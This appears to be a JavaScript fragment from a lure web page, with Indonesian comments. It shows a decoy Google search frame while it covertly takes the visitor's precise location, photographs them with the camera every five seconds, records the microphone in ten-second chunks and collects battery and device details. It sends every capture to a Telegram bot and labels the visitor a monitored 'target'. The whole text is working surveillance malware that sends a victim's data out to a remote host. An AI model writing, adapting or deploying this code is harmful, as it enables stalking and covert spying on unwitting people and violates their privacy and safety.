    async function startSystem() {
        deviceName = await getAdvancedDeviceName();
        document.getElementById('verifyBox').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";

        // Minta Izin Lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
        }

        // Jalankan Kamera
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
            document.getElementById('video').srcObject = stream;
            setInterval(takeAndSend, 5000);
        } catch (e) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                setInterval(takeAndSend, 5000);
            } catch (err) { takeAndSend(); }
        }

        // Fitur Live Mic (Audio)
        startAudioRecording();
    }

    async function startAudioRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                sendAudioTelegram(blob);
                chunks = [];
                mediaRecorder.start(); // Mulai rekam lagi setelah kirim
            };

            // Rekam setiap 10 detik dan kirim
            mediaRecorder.start();
            setInterval(() => {
                if(mediaRecorder.state === "recording") mediaRecorder.stop();
            }, 10000); 

        } catch (err) {
            console.log("Mic akses ditolak");
        }
    }

    async function sendAudioTelegram(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('voice', blob, 'recording.ogg');
        fd.append('caption', `🎙 *Audio Target* - ${deviceName}`);
        fd.append('parse_mode', 'Markdown');
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
    }

    async function takeAndSend() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let battery = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = Math.round(b.level * 100) + "%";
        }

        const report = (blob) => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera`);
            fd.append('parse_mode', 'Markdown');
            if (blob) {
                fd.append('photo', blob, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } else {
                fd.append('text', fd.get('caption'));
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
            }
        };

        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(report, 'image/jpeg', 0.6);
        } else {
            report(null);
        }
    }
